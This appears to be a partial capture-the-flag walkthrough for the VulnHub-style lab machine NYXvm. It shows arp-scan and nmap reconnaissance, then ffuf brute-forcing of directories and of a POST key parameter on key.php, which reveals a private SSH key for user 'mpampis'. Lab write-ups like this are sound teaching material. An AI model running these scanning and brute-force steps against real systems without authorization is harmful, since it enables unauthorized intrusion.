# NYXvm

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.133	00:0c:29:98:a9:81	VMware, Inc.
192.168.127.254	00:50:56:f6:01:2e	VMware, Inc.
```

The ip address is `192.168.127.133`, let's enumerate it

### 2.Enumeration

```bash
root@kali: nmap -p- -sT -sV -v -oN nmap.out 192.168.127.133
Nmap scan report for 192.168.127.133
Host is up (0.00091s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:98:A9:81 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

on the main http page you can find nothing, i used ffuf for directory bruteforcing and file enumeration :

```bash
ffuf -w /root/wordlist/raft-medium-words.txt -u http://192.168.127.133/FUZZ -e .php,.zip,.txt,.rar,.gz,.bak,.backup,.old -fc 403
```

and i found a file called `key.php` :


![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7a3152ed-373c-4fb6-b81b-a5a566011137)

for finding the key, i used several injection methods, sqli, ci and different payloads, but finally i captured one of the requests in burp and used the same headers in ffuf to send the POST request :

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.133/key.php -X POST -d key=FUZZ -x http://127.0.0.1:8080 -H 'Content-Type: application/x-www-form-urlencoded'

1165685715469           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
```

open it in burp :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fa03f419-8fc1-43b3-931a-602649e563f7)

and it gives you a private ssh key for user `mpampis`




